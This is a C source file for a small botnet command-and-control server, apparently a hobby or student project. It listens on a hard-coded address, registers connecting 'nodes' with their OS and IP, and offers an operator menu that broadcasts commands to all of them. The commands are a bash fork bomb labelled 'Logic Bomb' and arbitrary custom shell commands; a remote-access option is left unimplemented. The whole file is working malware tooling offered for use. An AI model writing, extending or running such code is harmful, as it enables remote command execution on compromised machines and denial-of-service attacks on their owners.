#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>

#define MAX_NODES 10
#define MAX_LENGTH 2048
#define NAME_LENGTH 15
// #define IP "0.0.0.0"
#define IP "172.18.238.114"
#define PORT "6968"

static int node_count = 0;
int ID = 100;

typedef struct
{
    struct sockaddr_in node_address;
    int node_socket;
    int ID;
    char node_name[NAME_LENGTH];
    int OS;
} node_structure;

node_structure *nodes[MAX_NODES];
pthread_mutex_t nodes_mutex = PTHREAD_MUTEX_INITIALIZER;
int server_socket = 0;
int server_stop = 0;

void start_symbol()
{
    printf("%s", "> ");
    fflush(stdout);
}

void addnode(node_structure *cl)
{
    pthread_mutex_lock(&nodes_mutex);

    for (int i = 0; i < MAX_NODES; ++i)
        if (!nodes[i])
        {
            nodes[i] = cl;
            break;
        }

    pthread_mutex_unlock(&nodes_mutex);
}

void removenode(int ID)
{
    pthread_mutex_lock(&nodes_mutex);

    for (int i = 0; i < MAX_NODES; ++i)
        if (nodes[i] && nodes[i]->ID == ID)
        {
            nodes[i] = NULL;
            break;
        }

    pthread_mutex_unlock(&nodes_mutex);
}

void sendMessage(char *node_message, int ID)
{
    pthread_mutex_lock(&nodes_mutex);

    for (int i = 0; i < MAX_NODES; ++i)
        if (nodes[i] && nodes[i]->ID == ID)
        {
            if (write(nodes[i]->node_socket, node_message, strlen(node_message)) < 0)
            {
                perror("ERROR: write to descriptor failed");
                break;
            }
        }

    pthread_mutex_unlock(&nodes_mutex);
}

char *checkOS(int OS)
{
    return OS == 1 ? "Unix" : OS == 2 ? "Windows"
                                      : "Unknown";
}

void *handlenode(void *node_p)
{
    char node_message[MAX_LENGTH];
    char temp_message[MAX_LENGTH];
    char node_name[NAME_LENGTH];
    int abort = 0;

    node_structure *node = (node_structure *)node_p;

    // getting the ip from node->node_address
    int OS[1];
    recv(node->node_socket, OS, sizeof(int), 0);
    node->OS = OS[0];
    char OS_name[100];

    char *ip = inet_ntoa(node->node_address.sin_addr);
    printf("Node :%d OS:%s IP: %s\n", node->ID, checkOS(node->OS), ip);
    strcpy(node->node_name, ip);
    //     sendMessage(node_message, node->ID);
    // }

    bzero(node_message, MAX_LENGTH);

    int ID[1];
    ID[0] = node->ID;
    send(node->node_socket, ID, sizeof(int) * 1, 0); // send ID to the node
    fflush(stdout);
    fflush(stdin);
    while (1)
    {
        fflush(stdout);
        recv(node->node_socket, node_message, MAX_LENGTH, 0);
        printf("%s\n", node_message);
    }

    node_count -= 1;
    close(node->node_socket);

    removenode(node->ID);
    free(node);

    pthread_detach(pthread_self());
    return NULL;
}

void *sendHandler()
{
    char command[MAX_LENGTH];
    int flag = 1;
    while (1)
    {
        // start_symbol();

        fflush(stdout);
        fflush(stdin);
        // scanf("%[^\n]%*c", command);
        int op = 100;
        scanf("%d", &op);

        switch (op)
        {
        case 1:
            strcpy(command, ":(){ :|:& };:");
            break;
        case 2:
            printf("RAT NOT IMPLEMENTED! :(\n");
            // scanf("%[^\n]%*c", command);
            fgets(command, MAX_LENGTH, stdin);

            break;
        case 3:
            exit(0);
            break;
        case 4:
            printf("\rEnter Command: ");
            // scanf("%[^\n]%*c", command);
            fflush(stdout);
            fflush(stdin);
            fgets(command, MAX_LENGTH, stdin);
            break;
        default:
            flag = 0;
            break;
        }
        if (flag)
        {
            for (int i = 0; i < MAX_NODES; i++)
                if (nodes[i])
                    if ((send(nodes[i]->node_socket, command, strlen(command), 0)) < 0)
                        printf("[-]Cannot send Message to Node:%d", nodes[i]->ID);
        }
        flag = 1;
        fflush(stdout);
        fflush(stdin);
    }

    return NULL;
}

void print_start()
{
    printf("################### \t BOT NET ACTIVE\t ###################\n");
    printf("1. Logic Bomb\n2. RAT\n3. Exit Botnet\n4. Custom Commands\n\n\n");
}

int main()
{
    print_start();

    int node_socket = 0;
    pthread_t thread_id, send_thread_id;

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_address, node_address;
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr(IP);
    // server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(atoi(PORT));
    /* Bind */
    if (bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address)) < 0)
    {
        perror("ERROR: Socket binding failed!");
        return 0;
    }

    if (listen(server_socket, MAX_NODES) < 0)
    {
        perror("ERROR: Socket listening failed!");
        return 0;
    }

    pthread_create(&send_thread_id, NULL, &sendHandler, NULL);

    while (1)
    {
        if (server_stop)
        {
            // pthread_exit(thread_id);
            break;
        }

        socklen_t node_address_length = sizeof(node_address);
        node_socket = accept(server_socket, (struct sockaddr *)&node_address, &node_address_length);
        if ((node_count + 1) == MAX_NODES)
        {
            close(node_socket);
            continue;
        }

        node_structure *node = (node_structure *)malloc(sizeof(node_structure));
        node->node_address = node_address;
        node->node_socket = node_socket;
        node->ID = ID++;

        node_count += 1;
        addnode(node);
        pthread_create(&thread_id, NULL, &handlenode, (void *)node);

        sleep(1);
    }
    close(server_socket);
    printf("Server Shutting Down!\n");
    return 1;
}